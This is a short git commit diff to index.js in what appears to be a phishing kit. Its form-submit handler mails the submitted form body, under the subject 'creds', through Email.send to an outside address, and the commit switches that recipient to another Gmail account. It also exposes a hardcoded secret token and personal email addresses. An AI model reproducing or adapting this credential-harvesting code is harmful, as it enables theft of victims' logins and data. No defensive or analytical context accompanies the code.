b9f6b2dd8113efb441938370a91766b51ed96eee
samuelhernandes <128768779+samuelhernandes@users.noreply.github.com>
2023-03-24 17:54:05 -0400

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,7 @@ submit.addEventListener("submit", (e) => {
 
   Email.send({
     SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
-    To: "maysaloumi@gmail.com",
+    To: "raakesh95misc@gmail.com",
     From: "airemirates@proton.me",
     Subject: "creds",
     Body: ebody,
